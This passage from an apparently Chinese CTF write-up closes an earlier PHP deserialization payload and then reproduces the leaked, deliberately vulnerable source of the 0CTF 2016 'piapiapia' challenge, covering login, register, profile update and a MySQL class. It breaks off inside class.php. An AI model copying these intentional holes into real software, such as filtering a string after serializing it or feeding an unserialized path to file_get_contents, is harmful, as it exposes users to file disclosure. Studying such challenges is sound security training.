double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>get传入pop=payload即可得到base64加密后的flag，解密即可。</p>
<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt loading="lazy"></p>
<p>题目一共四个界面，login，register，update和profile（也就是第一个显示界面）</p>
<p>前期探测sql注入和文件上传好像都没啥效果，随后扫一下发现存在<a href="http://www.zip源码泄露，代码审计">www.zip源码泄露，代码审计</a></p>
<p>简单看一下，省略HTML和一些无关部分</p>
<p>index.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> 
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> 
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
			<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">exit</span><span class="token punctuation">;</span>	
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name or password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span>
......(html)</code></pre>

<p>register.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> 
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> 
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token variable">$user</span><span class="token operator">-></span><span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Register OK!&lt;a href="index.php">Please Login&lt;/a>'</span><span class="token punctuation">;</span>		
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'User name Already Exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span>
......(html)</code></pre>

<p>update.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\d&#123;11&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token keyword">or</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1000000</span><span class="token punctuation">)</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$user</span><span class="token operator">-></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Update Profile Success!&lt;a href="profile.php">Your Profile&lt;/a>'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span>
......(html)
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>profile.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
......(html)
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<p>class.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span> <span class="token keyword">extends</span> <span class="token class-name">mysql</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users'</span><span class="token punctuation">;</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$key_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$value_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$object</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$object</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-></span><span class="token property">profile</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> __class__<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">mysql</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span>
			<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
			<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
			<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span>
		<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET sql_mode='strict_all_tables'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">link</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">select</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">,</span> <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT <span class="token interpolation"><span class="token variable">$ret</span></span> FROM <span class="token interpolation"><span class="token variable">$table</span></span> WHERE <span class="token interpolation"><span class="token variable">$where</span></span>"</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'\''</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\',\''</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\''</span><span class="token punctuation">;</span> 
